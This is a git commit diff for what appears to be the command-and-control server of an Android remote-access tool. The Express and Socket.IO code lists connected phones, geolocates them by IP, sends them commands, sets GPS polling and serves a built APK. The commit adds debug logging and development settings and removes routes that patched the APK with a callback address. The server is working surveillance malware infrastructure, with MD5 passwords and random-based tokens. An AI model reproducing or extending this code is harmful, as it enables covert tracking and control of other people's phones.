2d1aacbf004d46327102c408179952dfc1c5a02b
Vivek W <whitedevil367467@gmail.com>
2025-03-13 20:32:56 +0530

    dev option

--- includes/expressRoutes.js
+++ includes/expressRoutes.js
@@ -3,7 +3,8 @@ const
     routes = express.Router(),
     cookieParser = require('cookie-parser'),
     bodyParser = require('body-parser'),
-    crypto = require('crypto');
+    crypto = require('crypto'),
+    debug = require('./debug');
 
 let CONST = global.CONST;
 let db = global.db;
@@ -19,30 +20,42 @@ app.use(bodyParser.urlencoded({ extended: true }));
 function isAllowed(req, res, next) {
     let cookies = req.cookies;
     let loginToken = db.maindb.get('admin.loginToken').value();
+    debug.route(`Auth check for ${req.path}`);
+    
     if ('loginToken' in cookies) {
-        if (cookies.loginToken === loginToken) next();
-        else res.clearCookie('token').redirect('/login');
-    } else res.redirect('/login');
-    // next();
+        if (cookies.loginToken === loginToken) {
+            debug.route(`Auth successful for ${req.path}`);
+            next();
+        } else {
+            debug.route(`Invalid token for ${req.path}`);
+            res.clearCookie('token').redirect('/login');
+        }
+    } else {
+        debug.route(`No token found for ${req.path}`);
+        res.redirect('/login');
+    }
 }
 
 routes.get('/dl', (req, res) => {
+    debug.route('APK download requested');
     res.redirect('/build.s.apk');
 });
 
 routes.get('/', isAllowed, (req, res) => {
+    debug.route('Home page requested');
     res.render('index', {
         clientsOnline: clientManager.getClientListOnline(),
         clientsOffline: clientManager.getClientListOffline()
     });
 });
 
-
 routes.get('/login', (req, res) => {
+    debug.route('Login page requested');
     res.render('login');
 });
 
 routes.post('/login', (req, res) => {
+    debug.route('Login attempt');
     if ('username' in req.body) {
         if ('password' in req.body) {
             let rUsername = db.maindb.get('admin.username').value();
@@ -51,83 +64,93 @@ routes.post('/login', (req, res) => {
             if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                 let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                 db.maindb.get('admin').assign({ loginToken }).write();
+                debug.route('Login successful');
                 res.cookie('loginToken', loginToken).redirect('/');
-            } else return res.redirect('/login?e=badLogin');
-        } else return res.redirect('/login?e=missingPassword');
-    } else return res.redirect('/login?e=missingUsername');
+            } else {
+                debug.route('Invalid credentials');
+                return res.redirect('/login?e=badLogin');
+            }
+        } else {
+            debug.route('Missing password');
+            return res.redirect('/login?e=missingPassword');
+        }
+    } else {
+        debug.route('Missing username');
+        return res.redirect('/login?e=missingUsername');
+    }
 });
 
 routes.get('/logout', isAllowed, (req, res) => {
+    debug.route('Logout requested');
     db.maindb.get('admin').assign({ loginToken: '' }).write();
     res.redirect('/');
 });
 
-
-routes.get('/builder', isAllowed, (req, res) => {
-    res.render('builder', {
-        myPort: CONST.control_port
-    });
-});
-
-routes.post('/builder', isAllowed, (req, res) => {
-    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
-        if (!error) apkBuilder.buildAPK((error) => {
-            if (!error) {
-                logManager.log(CONST.logTypes.success, "Build Succeded!");
-                res.json({ error: false });
-            }
-            else {
-                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-                res.json({ error });
-            }
+routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
+    debug.route(`Device page requested: ${req.params.deviceid}/${req.params.page}`);
+    
+    // Get the device data using the clientID
+    let device = [...clientManager.getClientListOnline(), ...clientManager.getClientListOffline()]
+        .find(client => client.clientID === req.params.deviceid);
+    
+    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
+    
+    if (pageData && device) {
+        debug.route(`Rendering device page: ${req.params.page}`);
+        res.render('deviceManager', {
+            page: req.params.page,
+            deviceID: req.params.deviceid,
+            baseURL: '/manage/' + req.params.deviceid,
+            pageData,
+            device
         });
-        else {
-            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-            res.json({ error });
-        }
-    });
-    else {
-        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-        res.json({ error });
+    } else {
+        debug.route(`Device or page not found: ${req.params.deviceid}/${req.params.page}`);
+        res.render('deviceManager', {
+            page: 'notFound',
+            deviceID: req.params.deviceid,
+            baseURL: '/manage/' + req.params.deviceid
+        });
     }
 });
 
-
-routes.get('/logs', isAllowed, (req, res) => {
-    res.render('logs', {
-        logs: logManager.getLogs()
-    });
-});
-
-
-
-routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
-    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
-    if (pageData) res.render('deviceManager', {
-        page: req.params.page,
-        deviceID: req.params.deviceid,
-        baseURL: '/manage/' + req.params.deviceid,
-        pageData
-    });
-    else res.render('deviceManager', {
-        page: 'notFound',
-        deviceID: req.params.deviceid,
-        baseURL: '/manage/' + req.params.deviceid
-    });
-});
-
 routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
+    debug.route(`Command requested: ${req.params.deviceid}/${req.params.commandID}`);
     clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
-        if (!error) res.json({ error: false, message })
-        else res.json({ error })
+        if (!error) {
+            debug.route(`Command successful: ${req.params.commandID}`);
+            res.json({ error: false, message });
+        } else {
+            debug.route(`Command failed: ${req.params.commandID} - ${error}`);
+            res.json({ error });
+        }
     });
 });
 
 routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
+    debug.route(`GPS poll speed update requested: ${req.params.deviceid}/${req.params.speed}`);
     clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
-        if (!error) res.json({ error: false })
-        else res.json({ error })
+        if (!error) {
+            debug.route('GPS poll speed updated successfully');
+            res.json({ error: false });
+        } else {
+            debug.route(`GPS poll speed update failed: ${error}`);
+            res.json({ error });
+        }
     });
 });
+
+if (process.env.NODE_ENV === 'development') {
+    // Development-only error handler
+    routes.use((err, req, res, next) => {
+        debug.route(`Error: ${err.message}`);
+        console.error(err.stack);
+        res.status(500).json({
+            error: true,
+            message: err.message,
+            stack: err.stack
+        });
+    });
+}
 
 module.exports = routes;
--- index.js
+++ index.js
@@ -3,17 +3,17 @@
 *   By AryanVBW
 */
 
-
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    { Server } = require('socket.io'),
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
     logManager = require('./includes/logManager'),
     clientManager = new (require('./includes/clientManager'))(db),
-    apkBuilder = require('./includes/apkBuilder');
+    apkBuilder = require('./includes/apkBuilder'),
+    debug = require('./includes/debug');
 
 global.CONST = CONST;
 global.db = db;
@@ -22,10 +22,28 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// Development mode configuration
+if (process.env.NODE_ENV === 'development') {
+    debug.server('Running in development mode');
+    app.disable('view cache');
+}
 
-client_io.sockets.pingInterval = 30000;
+// Set up express
+app.set('view engine', 'ejs');
+app.set('views', './assets/views');
+app.use(express.static(__dirname + '/assets/webpublic'));
+app.use(require('./includes/expressRoutes'));
+
+// Create HTTP server
+const server = app.listen(CONST.web_port, () => {
+    debug.server(`Web server listening on port ${CONST.web_port}`);
+});
+
+// Initialize Socket.IO
+const client_io = new Server(server);
+debug.server(`Socket.IO attached to web server`);
+
+client_io.engine.pingInterval = 30000;
 client_io.on('connection', (socket) => {
     socket.emit('welcome');
     let clientParams = socket.handshake.query;
@@ -34,6 +52,8 @@ client_io.on('connection', (socket) => {
     let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
     let clientGeo = geoip.lookup(clientIP);
     if (!clientGeo) clientGeo = {}
+
+    debug.socket(`New client connected: ${clientParams.id} from ${clientIP}`);
 
     clientManager.clientConnect(socket, clientParams.id, {
         clientIP,
@@ -45,28 +65,14 @@ client_io.on('connection', (socket) => {
         }
     });
 
-    if (CONST.debug) {
+    if (process.env.NODE_ENV === 'development') {
         var onevent = socket.onevent;
         socket.onevent = function (packet) {
             var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            onevent.call(this, packet);
             packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
+            onevent.call(this, packet);
+            debug.socket(`Socket event: ${args[0]}`, args.slice(1));
         };
-
-        socket.on("*", function (event, data) {
-            console.log(event);
-            console.log(data);
-        });
     }
-
 });
-
-
-// get the admin interface online
-app.listen(CONST.web_port);
-
-app.set('view engine', 'ejs');
-app.set('views', './assets/views');
-app.use(express.static(__dirname + '/assets/webpublic'));
-app.use(require('./includes/expressRoutes'));
